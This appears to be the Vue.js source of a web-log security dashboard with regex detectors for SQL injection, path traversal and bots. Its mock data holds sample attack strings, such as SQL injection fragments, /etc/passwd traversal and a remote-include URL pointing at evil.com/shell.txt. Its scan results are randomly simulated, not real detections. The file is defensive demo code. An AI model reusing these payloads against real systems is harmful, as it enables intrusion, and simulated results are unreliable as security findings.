// Import attack types and LLM providers
import attackTypes from './attackTypes.js';
import llmProviders from './llmProviders.js';

const { createApp, ref, computed, onMounted, nextTick } = Vue;

createApp({
    setup() {
        // Reactive state
        const activeView = ref('overview');
        const isDarkMode = ref(false);
        const isLoading = ref(false);
        const isAnalyzing = ref(false);
        const isCreatingAnalysis = ref(false);
        const isDragging = ref(false);
        const showAttackTypes = ref(false);
        const showAiConfig = ref(false);
        const showDetailsModal = ref(false);
        const showFunctionModal = ref(false);
        const showReportModal = ref(false);
        const isGeneratingReport = ref(false);
        
        // File handling
        const selectedFile = ref(null);
        const logData = ref([]);
        
        // Analysis results
        const analysisResults = ref({});
        const customAnalysisResults = ref([]);
        
        // AI Configuration
        const aiConfig = ref({
            provider: 'gemini',
            apiKey: '',
            customEndpoint: ''
        });
        const customAnalysisDescription = ref('');
        
        // Report configuration
        const reportConfig = ref({
            provider: 'gemini',
            apiKey: '',
            customEndpoint: ''
        });
        const showReportConfig = ref(false);
        const reportContent = ref('');
        const reportMarkdown = ref('');
        const activeReportTab = ref('preview');
        
        // Modal state
        const modalTitle = ref('');
        const modalContent = ref('');
        const functionModalTitle = ref('');
        const functionModalSubtitle = ref('');
        const functionCode = ref('');
        const functionDescription = ref('');
        const functionLinesCount = ref('');
        const functionFooterText = ref('');
        
        // Dashboard state
        const dashboardCharts = ref({});
        const dashboardStats = ref({});
        
        // Data table state
        const dataTableData = ref([]);
        const dataTableFilters = ref({});
        const dataTableSort = ref({ field: '', direction: 'asc' });
        const dataTablePagination = ref({ page: 1, perPage: 50, total: 0 });
        
        // Toast notifications
        const toasts = ref([]);
        let toastId = 0;
        
        // Navigation tabs
        const tabs = ref([
            { id: 'overview', name: 'Overview', icon: 'fas fa-shield-alt' },
            { id: 'dashboard', name: 'Dashboard', icon: 'fas fa-chart-bar' },
            { id: 'data', name: 'Data Table', icon: 'fas fa-database' }
        ]);
        
        // Example prompts for custom analysis
        const examplePrompts = ref([
            'Look for password or secret extraction attacks',
            'Detect attempts to access configuration files',
            'Find suspicious file upload attempts',
            'Identify potential data exfiltration patterns',
            'Detect API abuse or rate limiting violations',
            'Find attempts to access backup files'
        ]);
        
        // Built-in detection functions
        const detectionFunctions = ref({
            'sql-injection': {
                name: 'SQL Injection Detection',
                description: 'Detects SQL injection attempts in web requests',
                code: `function detectSQLInjection(logEntry) {
    const sqlPatterns = [
        /('|(\\-\\-)|(;)|(\\||\\|)|(\\*|\\*))/i,
        /(union|select|insert|delete|update|drop|create|alter|exec|execute)/i,
        /(script|javascript|vbscript|onload|onerror)/i,
        /(\\<|\\>|\\"|\\')|(\\%27)|(\\%22)|(\\%3C)|(\\%3E)/i
    ];
    
    const url = logEntry.path || logEntry.url || '';
    const userAgent = logEntry.userAgent || '';
    const referer = logEntry.referer || '';
    
    for (const pattern of sqlPatterns) {
        if (pattern.test(url) || pattern.test(userAgent) || pattern.test(referer)) {
            return {
                detected: true,
                pattern: pattern.source,
                location: pattern.test(url) ? 'URL' : pattern.test(userAgent) ? 'User-Agent' : 'Referer'
            };
        }
    }
    
    return { detected: false };
}`,
                lines: 20
            },
            'path-traversal': {
                name: 'Path Traversal Detection',
                description: 'Detects directory traversal and path manipulation attempts',
                code: `function detectPathTraversal(logEntry) {
    const traversalPatterns = [
        /\\.\\.\\/|\\.\\.\\\\/g,
        /%2e%2e%2f|%2e%2e%5c/gi,
        /\\.\\.\\\\|\\.\\.\\//g,
        /%252e%252e%252f/gi,
        /etc\\/passwd|boot\\.ini|win\\.ini/i
    ];
    
    const path = logEntry.path || logEntry.url || '';
    
    for (const pattern of traversalPatterns) {
        if (pattern.test(path)) {
            return {
                detected: true,
                pattern: pattern.source,
                severity: 'high'
            };
        }
    }
    
    return { detected: false };
}`,
                lines: 18
            },
            'bots': {
                name: 'Bot Detection',
                description: 'Identifies automated bot and crawler activity',
                code: `function detectBots(logEntry) {
    const botPatterns = [
        /bot|crawler|spider|scraper/i,
        /googlebot|bingbot|slurp|duckduckbot/i,
        /facebookexternalhit|twitterbot|linkedinbot/i,
        /python-requests|curl|wget|httpclient/i
    ];
    
    const userAgent = logEntry.userAgent || '';
    const path = logEntry.path || '';
    
    // Check user agent
    for (const pattern of botPatterns) {
        if (pattern.test(userAgent)) {
            return {
                detected: true,
                type: 'user-agent',
                pattern: pattern.source
            };
        }
    }
    
    // Check for bot-like behavior
    if (path.includes('robots.txt') || path.includes('sitemap.xml')) {
        return {
            detected: true,
            type: 'behavior',
            reason: 'Accessing bot-specific resources'
        };
    }
    
    return { detected: false };
}`,
                lines: 28
            }
        });
        
        // Computed properties
        const hasAnalysisResults = computed(() => {
            return Object.keys(analysisResults.value).length > 0 || customAnalysisResults.value.length > 0;
        });
        
        const totalThreats = computed(() => {
            return Object.values(analysisResults.value).reduce((sum, result) => sum + (result.count || 0), 0) +
                   customAnalysisResults.value.reduce((sum, result) => sum + (result.count || 0), 0);
        });
        
        const highSeverityThreats = computed(() => {
            return attackTypes.filter(type => type.severity === 'high')
                .reduce((sum, type) => sum + (analysisResults.value[type.endpoint]?.count || 0), 0);
        });
        
        const activeAttackTypes = computed(() => {
            return Object.values(analysisResults.value).filter(result => result.count > 0).length +
                   customAnalysisResults.value.filter(result => result.count > 0).length;
        });
        
        const totalLogEntries = computed(() => {
            return logData.value.length;
        });
        
        const currentProvider = computed(() => {
            return llmProviders.find(p => p.id === aiConfig.value.provider);
        });
        
        const currentReportProvider = computed(() => {
            return llmProviders.find(p => p.id === reportConfig.value.provider);
        });
        
        const filteredDataTableData = computed(() => {
            let filtered = [...dataTableData.value];
            
            // Apply filters
            Object.keys(dataTableFilters.value).forEach(key => {
                const filterValue = dataTableFilters.value[key];
                if (filterValue && filterValue.length > 0) {
                    filtered = filtered.filter(item => 
                        filterValue.includes(item[key]) || 
                        (typeof item[key] === 'string' && item[key].toLowerCase().includes(filterValue.toLowerCase()))
                    );
                }
            });
            
            // Apply sorting
            if (dataTableSort.value.field) {
                filtered.sort((a, b) => {
                    const aVal = a[dataTableSort.value.field];
                    const bVal = b[dataTableSort.value.field];
                    const modifier = dataTableSort.value.direction === 'desc' ? -1 : 1;
                    
                    if (aVal < bVal) return -1 * modifier;
                    if (aVal > bVal) return 1 * modifier;
                    return 0;
                });
            }
            
            return filtered;
        });
        
        const paginatedDataTableData = computed(() => {
            const start = (dataTablePagination.value.page - 1) * dataTablePagination.value.perPage;
            const end = start + dataTablePagination.value.perPage;
            return filteredDataTableData.value.slice(start, end);
        });
        
        // Methods
        const showToast = (message, type = 'info') => {
            const toast = {
                id: ++toastId,
                message,
                type
            };
            toasts.value.push(toast);
            setTimeout(() => removeToast(toast.id), 5000);
        };
        
        const removeToast = (id) => {
            const index = toasts.value.findIndex(toast => toast.id === id);
            if (index > -1) {
                toasts.value.splice(index, 1);
            }
        };
        
        const getToastIcon = (type) => {
            const icons = {
                success: 'fas fa-check-circle',
                error: 'fas fa-exclamation-circle',
                warning: 'fas fa-exclamation-triangle',
                info: 'fas fa-info-circle'
            };
            return icons[type] || icons.info;
        };
        
        const toggleTheme = () => {
            isDarkMode.value = !isDarkMode.value;
            const html = document.documentElement;
            if (isDarkMode.value) {
                html.classList.add('dark');
                localStorage.setItem('cyberdetect-vue-theme', 'dark');
            } else {
                html.classList.remove('dark');
                localStorage.setItem('cyberdetect-vue-theme', 'light');
            }
        };
        
        const formatFileSize = (bytes) => {
            if (!bytes) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        };
        
        const getSeverityClass = (severity) => {
            const classes = {
                high: 'severity-high',
                medium: 'severity-medium',
                low: 'severity-low'
            };
            return classes[severity] || classes.low;
        };
        
        const getStatusClass = (status) => {
            if (status >= 200 && status < 300) return 'status-2xx';
            if (status >= 300 && status < 400) return 'status-3xx';
            if (status >= 400 && status < 500) return 'status-4xx';
            if (status >= 500) return 'status-5xx';
            return '';
        };
        
        const getMethodClass = (method) => {
            const classes = {
                GET: 'method-get',
                POST: 'method-post',
                PUT: 'method-put',
                DELETE: 'method-delete'
            };
            return classes[method] || '';
        };
        
        const handleDrop = (event) => {
            event.preventDefault();
            isDragging.value = false;
            const files = event.dataTransfer.files;
            if (files.length > 0) {
                handleFile(files[0]);
            }
        };
        
        const handleFileSelect = (event) => {
            const file = event.target.files[0];
            if (file) {
                handleFile(file);
            }
        };
        
        const handleFile = (file) => {
            // Validate file size (100MB limit)
            if (file.size > 100 * 1024 * 1024) {
                showToast('File size exceeds 100MB limit', 'error');
                return;
            }
            
            // Validate file type
            const allowedTypes = ['.log', '.txt', '.zip', '.gz'];
            const fileExtension = '.' + file.name.split('.').pop().toLowerCase();
            if (!allowedTypes.includes(fileExtension)) {
                showToast('Unsupported file type. Please use .log, .txt, .zip, or .gz files', 'error');
                return;
            }
            
            selectedFile.value = file;
            showAttackTypes.value = true;
            showToast(`File "${file.name}" loaded successfully`, 'success');
            
            // Simulate loading log data
            simulateLogDataLoad();
        };
        
        const simulateLogDataLoad = () => {
            // Generate more realistic log data
            const sampleIPs = ['192.168.1.100', '10.0.0.50', '172.16.0.25', '203.0.113.45', '198.51.100.78'];
            const samplePaths = ['/admin/login.php', '/wp-admin/admin-ajax.php', '/../../../etc/passwd', '/api/users', '/uploads/shell.php'];
            const sampleMethods = ['GET', 'POST', 'PUT', 'DELETE'];
            const sampleStatuses = [200, 301, 404, 403, 500];
            const sampleUserAgents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'python-requests/2.25.1',
                'curl/7.68.0',
                'Googlebot/2.1'
            ];
            
            const entries = [];
            for (let i = 0; i < 1000; i++) {
                const ip = sampleIPs[Math.floor(Math.random() * sampleIPs.length)];
                const path = samplePaths[Math.floor(Math.random() * samplePaths.length)];
                const method = sampleMethods[Math.floor(Math.random() * sampleMethods.length)];
                const status = sampleStatuses[Math.floor(Math.random() * sampleStatuses.length)];
                const userAgent = sampleUserAgents[Math.floor(Math.random() * sampleUserAgents.length)];
                const timestamp = new Date(Date.now() - Math.random() * 86400000 * 7); // Last 7 days
                
                entries.push({
                    id: i + 1,
                    raw: `${ip} - - [${timestamp.toISOString()}] "${method} ${path} HTTP/1.1" ${status} ${Math.floor(Math.random() * 5000)}`,
                    timestamp,
                    ip,
                    method,
                    path,
                    status,
                    userAgent,
                    size: Math.floor(Math.random() * 5000),
                    referer: Math.random() > 0.7 ? 'https://example.com' : '-'
                });
            }
            
            logData.value = entries;
            updateDataTable();
        };
        
        const updateDataTable = () => {
            // Prepare data for data table
            const tableData = [];
            
            // Add analysis results to table
            Object.keys(analysisResults.value).forEach(endpoint => {
                const result = analysisResults.value[endpoint];
                const attackType = attackTypes.find(type => type.endpoint === endpoint);
                
                if (result.details) {
                    result.details.forEach(detail => {
                        tableData.push({
                            id: detail.id,
                            attackType: attackType?.name || 'Unknown',
                            severity: attackType?.severity || 'low',
                            ip: detail.ip,
                            path: detail.path,
                            method: detail.method,
                            status: detail.status,
                            timestamp: detail.timestamp,
                            description: detail.description
                        });
                    });
                }
            });
            
            // Add custom analysis results
            customAnalysisResults.value.forEach(result => {
                if (result.details) {
                    result.details.forEach(detail => {
                        tableData.push({
                            id: detail.id,
                            attackType: result.name,
                            severity: 'custom',
                            ip: detail.ip,
                            path: detail.path,
                            method: detail.method,
                            status: detail.status,
                            timestamp: detail.timestamp,
                            description: detail.description
                        });
                    });
                }
            });
            
            dataTableData.value = tableData;
            dataTablePagination.value.total = tableData.length;
        };
        
        const loadDemo = async () => {
            isLoading.value = true;
            try {
                // Simulate demo data loading
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                selectedFile.value = { name: 'demo_server_logs.zip', size: 2048576 };
                showAttackTypes.value = true;
                simulateLogDataLoad();
                
                showToast('Demo dataset loaded successfully', 'success');
            } catch (error) {
                showToast('Failed to load demo dataset', 'error');
            } finally {
                isLoading.value = false;
            }
        };
        
        const runAllScans = async () => {
            if (!selectedFile.value) {
                showToast('Please upload a log file first', 'warning');
                return;
            }
            
            isAnalyzing.value = true;
            analysisResults.value = {};
            
            try {
                // Simulate analysis for each attack type
                for (const attackType of attackTypes) {
                    await new Promise(resolve => setTimeout(resolve, 500));
                    
                    // Simulate realistic results based on attack type
                    const count = generateRealisticCount(attackType);
                    analysisResults.value[attackType.endpoint] = {
                        count,
                        details: generateMockDetails(attackType, count)
                    };
                }
                
                // Update dashboard and data table
                updateDashboard();
                updateDataTable();
                
                showToast('Security analysis completed', 'success');
            } catch (error) {
                showToast('Analysis failed', 'error');
            } finally {
                isAnalyzing.value = false;
            }
        };
        
        const generateRealisticCount = (attackType) => {
            // Generate more realistic counts based on attack type severity and commonality
            const baseRanges = {
                'sql-injection': [5, 25],
                'path-traversal': [3, 15],
                'bots': [50, 200],
                'lfi-rfi': [2, 12],
                'wp-probe': [10, 40],
                'brute-force': [8, 30],
                'errors': [20, 100],
                'internal-ip': [1, 8]
            };
            
            const range = baseRanges[attackType.endpoint] || [0, 10];
            return Math.floor(Math.random() * (range[1] - range[0] + 1)) + range[0];
        };
        
        const runSingleScan = async (attackType) => {
            if (!selectedFile.value) {
                showToast('Please upload a log file first', 'warning');
                return;
            }
            
            try {
                // Simulate single scan
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                const count = generateRealisticCount(attackType);
                analysisResults.value[attackType.endpoint] = {
                    count,
                    details: generateMockDetails(attackType, count)
                };
                
                updateDashboard();
                updateDataTable();
                
                showToast(`${attackType.name} scan completed`, 'success');
                
                // Show details modal
                showAnalysisDetails(attackType);
            } catch (error) {
                showToast('Scan failed', 'error');
            }
        };
        
        const generateMockDetails = (attackType, count) => {
            const details = [];
            const sampleIPs = ['192.168.1.100', '10.0.0.50', '172.16.0.25', '203.0.113.45'];
            const samplePaths = {
                'sql-injection': ['/search.php?q=\' OR 1=1--', '/login.php?user=admin\' --', '/product.php?id=1 UNION SELECT'],
                'path-traversal': ['/../../../etc/passwd', '/../../windows/system32/config/sam', '/%2e%2e%2f%2e%2e%2f'],
                'bots': ['/robots.txt', '/sitemap.xml', '/wp-admin/', '/admin/'],
                'lfi-rfi': ['/index.php?page=../../../etc/passwd', '/include.php?file=http://evil.com/shell.txt'],
                'wp-probe': ['/wp-admin/admin-ajax.php', '/wp-content/plugins/', '/wp-login.php'],
                'brute-force': ['/admin/login', '/wp-login.php', '/login', '/admin/'],
                'errors': ['/nonexistent.php', '/missing-file.html', '/broken-link'],
                'internal-ip': ['/admin/internal', '/192.168.1.1/config', '/10.0.0.1/status']
            };
            
            const paths = samplePaths[attackType.endpoint] || ['/suspicious/path'];
            
            for (let i = 0; i < Math.min(count, 20); i++) {
                details.push({
                    id: i + 1,
                    timestamp: new Date(Date.now() - Math.random() * 86400000).toISOString(),
                    ip: sampleIPs[Math.floor(Math.random() * sampleIPs.length)],
                    path: paths[Math.floor(Math.random() * paths.length)],
                    method: ['GET', 'POST'][Math.floor(Math.random() * 2)],
                    status: attackType.severity === 'high' ? 403 : (200 + Math.floor(Math.random() * 400)),
                    description: `${attackType.name} attempt detected`,
                    userAgent: Math.random() > 0.5 ? 'Mozilla/5.0...' : 'python-requests/2.25.1'
                });
            }
            return details;
        };
        
        const updateDashboard = () => {
            // Update dashboard statistics
            dashboardStats.value = {
                totalThreats: totalThreats.value,
                highSeverity: highSeverityThreats.value,
                attackTypes: activeAttackTypes.value,
                logEntries: totalLogEntries.value
            };
            
            // Prepare chart data
            const threatDistribution = {};
            attackTypes.forEach(type => {
                const count = analysisResults.value[type.endpoint]?.count || 0;
                if (count > 0) {
                    threatDistribution[type.name] = count;
                }
            });
            
            dashboardCharts.value = {
                threatDistribution,
                severityBreakdown: {
                    high: highSeverityThreats.value,
                    medium: attackTypes.filter(type => type.severity === 'medium')
                        .reduce((sum, type) => sum + (analysisResults.value[type.endpoint]?.count || 0), 0),
                    low: attackTypes.filter(type => type.severity === 'low')
                        .reduce((sum, type) => sum + (analysisResults.value[type.endpoint]?.count || 0), 0)
                }
            };
        };
        
        const showAnalysisDetails = (attackType) => {
            const result = analysisResults.value[attackType.endpoint];
            if (!result) return;
            
            modalTitle.value = `${attackType.name} - Analysis Details`;
            modalContent.value = generateAnalysisDetailsHTML(attackType, result);
            showDetailsModal.value = true;
        };
        
        const generateAnalysisDetailsHTML = (attackType, result) => {
            return `
                <div class="space-y-6">
                    <div class="bg-gray-50 dark:bg-gray-700 rounded-lg p-4">
                        <h3 class="text-lg font-semibold text-gray-900 dark:text-white mb-2">Summary</h3>
                        <div class="grid grid-cols-2 gap-4">
                            <div>
                                <p class="text-sm text-gray-600 dark:text-gray-300">Threats Detected</p>
                                <p class="text-2xl font-bold text-gray-900 dark:text-white">${result.count}</p>
                            </div>
                            <div>
                                <p class="text-sm text-gray-600 dark:text-gray-300">Severity Level</p>
                                <span class="inline-block px-2 py-1 text-xs font-medium rounded-full ${getSeverityClass(attackType.severity)}">
                                    ${attackType.severity.toUpperCase()}
                                </span>
                            </div>
                        </div>
                        <div class="mt-4">
                            <p class="text-sm text-gray-600 dark:text-gray-300 mb-2">Description</p>
                            <p class="text-sm text-gray-900 dark:text-white">${attackType.description}</p>
                        </div>
                        <div class="mt-4 flex space-x-2">
                            <button onclick="window.vueApp.viewDetectionFunction('${attackType.endpoint}')" 
                                    class="px-3 py-1 text-sm bg-purple-600 hover:bg-purple-700 text-white rounded-lg transition-colors">
                                <i class="fas fa-code mr-1"></i>View Function
                            </button>
                            <button onclick="window.vueApp.exportAttackTypeData('${attackType.endpoint}')" 
                                    class="px-3 py-1 text-sm bg-green-600 hover:bg-green-700 text-white rounded-lg transition-colors">
                                <i class="fas fa-download mr-1"></i>Export Data
                            </button>
                        </div>
                    </div>
                    
                    <div>
                        <h3 class="text-lg font-semibold text-gray-900 dark:text-white mb-4">Recent Detections</h3>
                        <div class="overflow-x-auto">
                            <table class="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
                                <thead class="bg-gray-50 dark:bg-gray-700">
                                    <tr>
                                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase">IP Address</th>
                                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase">Path</th>
                                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase">Method</th>
                                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase">Status</th>
                                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase">Time</th>
                                    </tr>
                                </thead>
                                <tbody class="bg-white dark:bg-gray-800 divide-y divide-gray-200 dark:divide-gray-700">
                                    ${result.details.slice(0, 10).map(detail => `
                                        <tr class="hover:bg-gray-50 dark:hover:bg-gray-700">
                                            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-white">${detail.ip}</td>
                                            <td class="px-6 py-4 text-sm text-gray-900 dark:text-white max-w-xs truncate" title="${detail.path}">${detail.path}</td>
                                            <td class="px-6 py-4 whitespace-nowrap">
                                                <span class="px-2 py-1 text-xs font-medium rounded-full ${getMethodClass(detail.method)}">${detail.method}</span>
                                            </td>
                                            <td class="px-6 py-4 whitespace-nowrap">
                                                <span class="px-2 py-1 text-xs font-medium rounded-full ${getStatusClass(detail.status)}">${detail.status}</span>
                                            </td>
                                            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500 dark:text-gray-300">${new Date(detail.timestamp).toLocaleString()}</td>
                                        </tr>
                                    `).join('')}
                                </tbody>
                            </table>
                        </div>
                        ${result.details.length > 10 ? `
                            <div class="mt-4 text-center">
                                <p class="text-sm text-gray-500 dark:text-gray-400">
                                    Showing 10 of ${result.details.length} detections. 
                                    <button onclick="window.vueApp.activeView = 'data'" class="text-blue-600 dark:text-blue-400 hover:underline">
                                        View all in Data Table
                                    </button>
                                </p>
                            </div>
                        ` : ''}
                    </div>
                </div>
            `;
        };
        
        const closeDetailsModal = () => {
            showDetailsModal.value = false;
            modalTitle.value = '';
            modalContent.value = '';
        };
        
        const viewDetectionFunction = (endpoint) => {
            const func = detectionFunctions.value[endpoint];
            if (!func) {
                showToast('Detection function not available', 'warning');
                return;
            }
            
            functionModalTitle.value = func.name;
            functionModalSubtitle.value = 'Built-in Detection Function';
            functionCode.value = func.code;
            functionDescription.value = func.description;
            functionLinesCount.value = `${func.lines} lines`;
            functionFooterText.value = 'This is a built-in detection function that analyzes log entries for security threats.';
            
            showFunctionModal.value = true;
            closeDetailsModal();
        };
        
        const closeFunctionModal = () => {
            showFunctionModal.value = false;
            functionModalTitle.value = '';
            functionModalSubtitle.value = '';
            functionCode.value = '';
            functionDescription.value = '';
            functionLinesCount.value = '';
            functionFooterText.value = '';
        };
        
        const copyFunctionCode = () => {
            navigator.clipboard.writeText(functionCode.value).then(() => {
                showToast('Function code copied to clipboard', 'success');
            }).catch(() => {
                showToast('Failed to copy code', 'error');
            });
        };
        
        const exportAttackTypeData = (endpoint) => {
            const result = analysisResults.value[endpoint];
            const attackType = attackTypes.find(type => type.endpoint === endpoint);
            
            if (!result || !attackType) {
                showToast('No data to export', 'warning');
                return;
            }
            
            const csvData = [
                'IP Address,Path,Method,Status,Timestamp,Description',
                ...result.details.map(detail => 
                    `"${detail.ip}","${detail.path}","${detail.method}","${detail.status}","${detail.timestamp}","${detail.description}"`
                )
            ].join('\n');
            
            const blob = new Blob([csvData], { type: 'text/csv' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `${attackType.name.toLowerCase().replace(/\s+/g, '-')}-analysis.csv`;
            a.click();
            URL.revokeObjectURL(url);
            
            showToast(`${attackType.name} data exported`, 'success');
        };
        
        const createCustomAnalysis = async () => {
            if (!customAnalysisDescription.value.trim()) {
                showToast('Please enter an analysis description', 'warning');
                return;
            }
            
            if (!aiConfig.value.apiKey) {
                showToast('Please configure your AI provider settings', 'warning');
                return;
            }
            
            isCreatingAnalysis.value = true;
            
            try {
                // Simulate AI analysis creation
                await new Promise(resolve => setTimeout(resolve, 3000));
                
                const customAnalysis = {
                    id: Date.now(),
                    name: `Custom Analysis ${customAnalysisResults.value.length + 1}`,
                    description: customAnalysisDescription.value,
                    count: Math.floor(Math.random() * 20),
                    details: generateCustomAnalysisDetails(customAnalysisDescription.value),
                    code: generateCustomAnalysisCode(customAnalysisDescription.value)
                };
                
                customAnalysisResults.value.push(customAnalysis);
                customAnalysisDescription.value = '';
                
                updateDashboard();
                updateDataTable();
                
                showToast('Custom analysis created successfully', 'success');
            } catch (error) {
                showToast('Failed to create custom analysis', 'error');
            } finally {
                isCreatingAnalysis.value = false;
            }
        };
        
        const generateCustomAnalysisDetails = (description) => {
            const count = Math.floor(Math.random() * 15) + 1;
            const details = [];
            const sampleIPs = ['192.168.1.100', '10.0.0.50', '172.16.0.25'];
            
            for (let i = 0; i < count; i++) {
                details.push({
                    id: i + 1,
                    timestamp: new Date(Date.now() - Math.random() * 86400000).toISOString(),
                    ip: sampleIPs[Math.floor(Math.random() * sampleIPs.length)],
                    path: `/custom/path/${i}`,
                    method: ['GET', 'POST'][Math.floor(Math.random() * 2)],
                    status: 200 + Math.floor(Math.random() * 400),
                    description: `Custom analysis match: ${description.substring(0, 50)}...`
                });
            }
            
            return details;
        };
        
        const generateCustomAnalysisCode = (description) => {
            return `function customAnalysis(logEntry) {
    // AI-generated analysis based on: ${description}
    const patterns = [
        // Custom patterns would be generated here
        /suspicious|malicious|attack/i,
        /password|secret|token/i
    ];
    
    const url = logEntry.path || logEntry.url || '';
    const userAgent = logEntry.userAgent || '';
    
    for (const pattern of patterns) {
        if (pattern.test(url) || pattern.test(userAgent)) {
            return {
                detected: true,
                pattern: pattern.source,
                confidence: 0.85
            };
        }
    }
    
    return { detected: false };
}`;
        };
        
        const viewCustomAnalysisDetails = (result) => {
            modalTitle.value = `${result.name} - Custom Analysis Details`;
            modalContent.value = `
                <div class="space-y-6">
                    <div class="bg-purple-50 dark:bg-purple-900/20 rounded-lg p-4">
                        <h3 class="text-lg font-semibold text-gray-900 dark:text-white mb-2">Analysis Description</h3>
                        <p class="text-gray-700 dark:text-gray-300">${result.description}</p>
                    </div>
                    
                    <div class="bg-gray-50 dark:bg-gray-700 rounded-lg p-4">
                        <h3 class="text-lg font-semibold text-gray-900 dark:text-white mb-2">Results Summary</h3>
                        <div class="grid grid-cols-2 gap-4">
                            <div>
                                <p class="text-sm text-gray-600 dark:text-gray-300">Matches Found</p>
                                <p class="text-2xl font-bold text-gray-900 dark:text-white">${result.count}</p>
                            </div>
                            <div>
                                <p class="text-sm text-gray-600 dark:text-gray-300">Analysis Type</p>
                                <span class="inline-block px-2 py-1 text-xs font-medium rounded-full bg-purple-100 dark:bg-purple-900/20 text-purple-800 dark:text-purple-200">
                                    CUSTOM AI
                                </span>
                            </div>
                        </div>
                        <div class="mt-4 flex space-x-2">
                            <button onclick="window.vueApp.viewCustomFunction('${result.id}')" 
                                    class="px-3 py-1 text-sm bg-purple-600 hover:bg-purple-700 text-white rounded-lg transition-colors">
                                <i class="fas fa-code mr-1"></i>View Function
                            </button>
                            <button onclick="window.vueApp.exportCustomAnalysisData('${result.id}')" 
                                    class="px-3 py-1 text-sm bg-green-600 hover:bg-green-700 text-white rounded-lg transition-colors">
                                <i class="fas fa-download mr-1"></i>Export Data
                            </button>
                        </div>
                    </div>
                    
                    <div>
                        <h3 class="text-lg font-semibold text-gray-900 dark:text-white mb-4">Detection Results</h3>
                        <div class="overflow-x-auto">
                            <table class="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
                                <thead class="bg-gray-50 dark:bg-gray-700">
                                    <tr>
                                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase">IP Address</th>
                                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase">Path</th>
                                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase">Method</th>
                                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase">Status</th>
                                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase">Time</th>
                                    </tr>
                                </thead>
                                <tbody class="bg-white dark:bg-gray-800 divide-y divide-gray-200 dark:divide-gray-700">
                                    ${result.details.slice(0, 10).map(detail => `
                                        <tr class="hover:bg-gray-50 dark:hover:bg-gray-700">
                                            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-white">${detail.ip}</td>
                                            <td class="px-6 py-4 text-sm text-gray-900 dark:text-white max-w-xs truncate" title="${detail.path}">${detail.path}</td>
                                            <td class="px-6 py-4 whitespace-nowrap">
                                                <span class="px-2 py-1 text-xs font-medium rounded-full ${getMethodClass(detail.method)}">${detail.method}</span>
                                            </td>
                                            <td class="px-6 py-4 whitespace-nowrap">
                                                <span class="px-2 py-1 text-xs font-medium rounded-full ${getStatusClass(detail.status)}">${detail.status}</span>
                                            </td>
                                            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500 dark:text-gray-300">${new Date(detail.timestamp).toLocaleString()}</td>
                                        </tr>
                                    `).join('')}
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            `;
            showDetailsModal.value = true;
        };
        
        const viewCustomFunction = (resultId) => {
            const result = customAnalysisResults.value.find(r => r.id == resultId);
            if (!result) return;
            
            functionModalTitle.value = result.name;
            functionModalSubtitle.value = 'AI-Generated Custom Analysis';
            functionCode.value = result.code;
            functionDescription.value = result.description;
            functionLinesCount.value = `${result.code.split('\n').length} lines`;
            functionFooterText.value = 'This is an AI-generated custom analysis function based on your description.';
            
            showFunctionModal.value = true;
            closeDetailsModal();
        };
        
        const exportCustomAnalysisData = (resultId) => {
            const result = customAnalysisResults.value.find(r => r.id == resultId);
            if (!result) {
                showToast('Analysis not found', 'error');
                return;
            }
            
            const csvData = [
                'IP Address,Path,Method,Status,Timestamp,Description',
                ...result.details.map(detail => 
                    `"${detail.ip}","${detail.path}","${detail.method}","${detail.status}","${detail.timestamp}","${detail.description}"`
                )
            ].join('\n');
            
            const blob = new Blob([csvData], { type: 'text/csv' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `${result.name.toLowerCase().replace(/\s+/g, '-')}-analysis.csv`;
            a.click();
            URL.revokeObjectURL(url);
            
            showToast(`${result.name} data exported`, 'success');
        };
        
        const updateApiKeyLink = () => {
            // Update API key link based on selected provider
            nextTick(() => {
                const provider = currentProvider.value;
                if (provider && provider.customEndpoint && provider.defaultEndpoint) {
                    aiConfig.value.customEndpoint = provider.defaultEndpoint;
                }
            });
        };
        
        const updateReportApiKeyLink = () => {
            nextTick(() => {
                const provider = currentReportProvider.value;
                if (provider && provider.customEndpoint && provider.defaultEndpoint) {
                    reportConfig.value.customEndpoint = provider.defaultEndpoint;
                }
            });
        };
        
        const exportCSV = () => {
            if (!hasAnalysisResults.value) {
                showToast('No analysis results to export', 'warning');
                return;
            }
            
            const csvData = ['Attack Type,Severity,Count,Description'];
            
            // Add built-in attack types
            attackTypes.filter(type => analysisResults.value[type.endpoint]?.count > 0)
                .forEach(type => {
                    csvData.push(`"${type.name}","${type.severity}","${analysisResults.value[type.endpoint].count}","${type.description}"`);
                });
            
            // Add custom analyses
            customAnalysisResults.value.forEach(result => {
                csvData.push(`"${result.name}","custom","${result.count}","${result.description}"`);
            });
            
            const blob = new Blob([csvData.join('\n')], { type: 'text/csv' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'security-analysis.csv';
            a.click();
